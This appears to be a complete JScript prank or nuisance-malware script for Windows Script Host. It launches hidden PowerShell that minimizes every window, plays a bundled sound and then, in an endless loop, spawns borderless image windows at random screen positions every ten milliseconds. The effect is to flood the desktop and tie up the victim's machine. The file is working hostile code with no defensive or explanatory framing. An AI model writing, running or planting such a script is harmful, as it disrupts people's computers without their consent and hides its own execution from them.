c = '$a = New-Object System.Media.SoundPlayer;' +
    '$a.SoundLocation = \'res\\t.wav\';' +
    '[void][reflection.assembly]::LoadWithPartialName(\'System.Windows.Forms\');' +
    '$s = [System.Drawing.Image]::Fromfile((get-item \'res\\t.png\'));' +
    'function nf {' +
    '    $f = New-Object system.Windows.Forms.Form;' +
    '    $f.StartPosition = \'manual\';' +
    '    $f.Top = (Get-Random -Minimum 0 -Maximum 1000);' +
    '    $f.Left = (Get-Random -Minimum 0 -Maximum 1000);' +
    '    $f.Width = 350;' +
    '    $f.Height = 310;' +
    '    $f.FormBorderStyle = \'none\';' +
    '    $i = New-Object system.Windows.Forms.PictureBox;' +
    '    $i.Image = $s;' +
    '    $i.Width = 32767;' +
    '    $i.Height = 32767;' +
    '    $f.Controls.AddRange(@($i));' +
    '    return $f' +
    '}' +
    '(New-Object -ComObject Shell.Application).MinimizeAll();' +
    '$a.Play();' +
    'while ($true) {' +
    '    (nf).Show();' +
    '    Start-Sleep -Milliseconds 10;' +
    '}'

new ActiveXObject('WScript.Shell').run('cmd /c powershell ' + c, 0, true);